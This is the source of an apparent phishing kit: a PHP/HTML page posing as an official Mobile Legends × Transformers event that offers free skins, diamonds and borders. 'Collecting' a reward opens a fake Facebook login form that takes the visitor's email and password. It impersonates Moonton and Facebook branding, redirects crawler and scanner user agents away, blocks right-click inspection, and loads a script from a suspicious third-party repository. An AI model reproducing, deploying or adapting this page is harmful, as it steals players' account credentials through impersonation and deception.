<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
body {
	
	background-size: 100% 100%;
	margin: 0;
	font-family: 'Teko', sans-serif;
}
.container {
	background: url(https://i.postimg.cc/8zyXwFZv/bg-top-094c1508.png) no-repeat center center;
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
}
.navbar-logo {
	width: 130px;
	float: left;
	margin-top: 15px;
	margin-left: -5px;
}
.event-theme {
	background:url(https://i.postimg.cc/SKRStMkb/event-theme.png) no-repeat center center;
	background-size: 100% 100%;
	width:91%;
	height:60px;
	margin-left:auto;
	margin-right:auto;
	padding: 5px;
	display:block;
}
.scroll {
	height: 430px;
    
    overflow-y: scroll;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.item {
	width: 26%;
	height: 140px;
	margin: 10px;
	margin-bottom: 40px;
	display: inline-block;
}
.item div {
	width: 100%;
	height: 100%;
	border-radius: 5px 5px 0px 0px;
}
.item .item-nominal {
	margin-top: 61%;
	padding-right: 3px;
	color: #fff;
	font-size: 25px;
	font-family: Teko;
	text-align: right;
	position: absolute;
}
.item img {
	width: 100%;
    height: 100%;
}
.item img, .item button {
	border:1.5px solid #07EEF5;
}
.item div:first-child {
	margin-left: 0;
}
.popup-item {
	width:25%;
	height:120px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	display: block;
}
</style>
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/RFxVt2PL/IMG-20220518-122857.png">
<div class="navbar-right">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<iframe width="400" height="235" src="https://www.youtube.com/embed/gDUq6Z5TeP8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</div> <!--- header --->
<div class="event-theme">
<div class="event-theme-icon"><img src="https://i.postimg.cc/SNKrHK43/20220518-124240.png"></div> <!--- event-theme-icon --->
<div class="event-theme-title">MOBILE LEGENDS × TRANSFORMERS</div> <!--- event-theme-title --->
<div class="event-theme-subtitle">Choose and collect the rewards you want</div> <!--- event-theme-subtitle --->
</div> <!--- event-theme-icon --->
<div class="box">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Diamond</div> <!--- menu-content --->
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Limited Skin</div> <!--- menu-content --->
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Borders</div> <!--- menu-content --->
</div> <!--- menu-wrapper --->
<center>
<div class="tab_rewards" id="season">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/6Q28NpYw/IMG-20220524-181348.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/6Q28NpYw/IMG-20220524-181348.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/PJxGBPQQ/IMG-20220524-181326.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/PJxGBPQQ/IMG-20220524-181326.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QVFd91M/IMG-20220524-181304.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/0QVFd91M/IMG-20220524-181304.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Y24CNVx2/Screenshot-20220803-143401-copy-198x331.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/Y24CNVx2/Screenshot-20220803-143401-copy-198x331.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/MK9whm53/Screenshot-20220803-143410-copy-202x330.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/MK9whm53/Screenshot-20220803-143410-copy-202x330.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/50QqMg8B/Screenshot-20220803-143354-copy-213x336.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/50QqMg8B/Screenshot-20220803-143354-copy-213x336.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/fyJcLQjr/1650272368820.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/fyJcLQjr/1650272368820.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/W3vX7c5g/IMG-20220513-160904.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/W3vX7c5g/IMG-20220513-160904.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/x1mY0VSq/kbr-legend-guin.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/x1mY0VSq/kbr-legend-guin.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxLT8s2W/kbr-M-World-ling.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/QxLT8s2W/kbr-M-World-ling.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/284B3MY9/kbr-M-World-Wan-Wan.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/284B3MY9/kbr-M-World-Wan-Wan.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/vZbxnhHY/kbr-M-World-yin.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/vZbxnhHY/kbr-M-World-yin.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/ZqfN4NmT/kbr-515-zilong.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/ZqfN4NmT/kbr-515-zilong.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/yxbDYCBW/Screenshot-20220803-143354-copy-206x328.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/yxbDYCBW/Screenshot-20220803-143354-copy-206x328.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/909wdN7M/kbr-515 eParty-claude.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/909wdN7M/kbr-515 eParty-claude.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/qRz3R7B2/kbr-515 eParty-chang-e.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/qRz3R7B2/kbr-515 eParty-chang-e.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/XNB56Xzb/kbr-515 eParty-floryn.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/XNB56Xzb/kbr-515 eParty-floryn.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/26PJVJXC/7.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/26PJVJXC/7.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/CKRmk785/6.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/CKRmk785/6.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/4yD9C40z/10.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/4yD9C40z/10.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QNw5KSMH/11.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/QNw5KSMH/11.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/xTtwyy5m/Remini20220201162633334.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/xTtwyy5m/Remini20220201162633334.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/cLCVDgkb/Remini20220201162658437.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/cLCVDgkb/Remini20220201162658437.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Rh1LhTGj/Screenshot-20220803-143410-copy-200x326.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/Rh1LhTGj/Screenshot-20220803-143410-copy-200x326.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/NjZNxhg8/m3-prime.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/NjZNxhg8/m3-prime.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/pXGcph46/m3-roger.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/pXGcph46/m3-roger.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/MHZtGqDw/selena-tehyung.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/MHZtGqDw/selena-tehyung.jpg">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="weapon"> <!--- Borders --->
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/W3R9b1rs/Screenshot-20220803-163416-copy-136x147.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/W3R9b1rs/Screenshot-20220803-163416-copy-136x147.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/90msCf5r/Screenshot-20220803-163416-copy-134x128.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/90msCf5r/Screenshot-20220803-163416-copy-134x128.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/pX8c48nq/Screenshot-20220803-163416-copy-135x130.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/pX8c48nq/Screenshot-20220803-163416-copy-135x130.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/y8pRTpY5/Screenshot-20220803-163416-copy-136x145.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/y8pRTpY5/Screenshot-20220803-163416-copy-136x145.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/mDsg37MJ/Screenshot-20220803-163416-copy-138x150.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/mDsg37MJ/Screenshot-20220803-163416-copy-138x150.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/zDh9Z4sC/Screenshot-20220803-163416-copy-131x144.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/zDh9Z4sC/Screenshot-20220803-163416-copy-131x144.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/KjLWFg47/Screenshot-20220803-163416-copy-141x136.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/KjLWFg47/Screenshot-20220803-163416-copy-141x136.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/GhxMQRDp/Screenshot-20220803-163424-copy-144x135.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/GhxMQRDp/Screenshot-20220803-163424-copy-144x135.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/6qGk3mbv/Screenshot-20220803-163424-copy-131x145.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/6qGk3mbv/Screenshot-20220803-163424-copy-131x145.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/HnywjqGX/Screenshot-20220803-163424-copy-138x136.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/HnywjqGX/Screenshot-20220803-163424-copy-138x136.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Y0RpN9wH/Screenshot-20220803-163424-copy-142x138.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/Y0RpN9wH/Screenshot-20220803-163424-copy-142x138.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/NGJSXT30/Screenshot-20220803-163430-copy-135x135.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/NGJSXT30/Screenshot-20220803-163430-copy-135x135.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/qqPGLkc1/Screenshot-20220803-163430-copy-129x142.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/qqPGLkc1/Screenshot-20220803-163430-copy-129x142.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/bJK66Hp0/Screenshot-20220803-163430-copy-126x136.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/bJK66Hp0/Screenshot-20220803-163430-copy-126x136.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/htcKyVGq/Screenshot-20220803-163430-copy-131x140.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/htcKyVGq/Screenshot-20220803-163430-copy-131x140.jpg">Collect</button>
</div>
</div>

</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="other"> <!--- Diamond --->
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/1tWY1nwX/Screenshot-20220803-170850-copy-264x195.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/1tWY1nwX/Screenshot-20220803-170850-copy-264x195.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/zBFm4GXP/Screenshot-20220803-170850-copy-253x193.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/zBFm4GXP/Screenshot-20220803-170850-copy-253x193.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/JnP6bDhm/Screenshot-20220803-170850-copy-247x197.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/JnP6bDhm/Screenshot-20220803-170850-copy-247x197.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/QdQqQ96P/Screenshot-20220803-170850-copy-249x190.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/QdQqQ96P/Screenshot-20220803-170850-copy-249x190.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/63vVQ8GY/Screenshot-20220803-170850-copy-254x197.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/63vVQ8GY/Screenshot-20220803-170850-copy-254x197.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/xdHqJMtJ/Screenshot-20220803-170850-copy-251x197.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/xdHqJMtJ/Screenshot-20220803-170850-copy-251x197.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/pXhvLx0y/Screenshot-20220803-170850-copy-241x197.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/pXhvLx0y/Screenshot-20220803-170850-copy-241x197.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/RZvzQfSJ/Screenshot-20220803-170850-copy-249x195.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/RZvzQfSJ/Screenshot-20220803-170850-copy-249x195.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/h48y8YfM/Screenshot-20220803-170857-copy-252x195.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/h48y8YfM/Screenshot-20220803-170857-copy-252x195.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;"
src="https://i.postimg.cc/FHk0pfTm/Screenshot-20220803-170857-copy-239x192.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/FHk0pfTm/Screenshot-20220803-170857-copy-239x192.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/qM4kQWQ7/Screenshot-20220803-170857-copy-242x188.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/qM4kQWQ7/Screenshot-20220803-170857-copy-242x188.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/g0qsyX0j/Screenshot-20220803-170857-copy-249x192.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/g0qsyX0j/Screenshot-20220803-170857-copy-249x192.jpg">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="https://i.postimg.cc/L85Y0jBg/20220518-143620.png">
<div class="footer-txt-copyright">ⓒ <?php echo $yearNow;?> Moonton Technology Co. Ltd</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup otherReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<span id="otherReward_confirmationValue"></span>
<img src="" id="myOtherReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://rawcdn.githack.com/AlexHostX/logAlex/391a0879c14c7ba91729a2271cfc42f3f874c190/mlbb.webp">
<div class="txt-login-fb">Log in to your Facebook account to connect to MOBILE LEGENDS</div> <!--- txt-login-fb --->
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm" onsubmit="$(this).end()">
<input type="text" class="loginEmail" name="user" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
<input type="password" class="loginPassword" name="pass" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- showPassword --->
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- hidePassword --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb--->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->
<script src="https://cdn.jsdelivr.net/gh/stylesheett/jquery.min.js@main/slim.js"></script>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="https://play-lh.googleusercontent.com/jWN9pjF7atbqHYXAAfwvIjtzpGwTIVwX9etT0-9HiWjRjE1hInoEgJiWjwsiemu2rEb8">
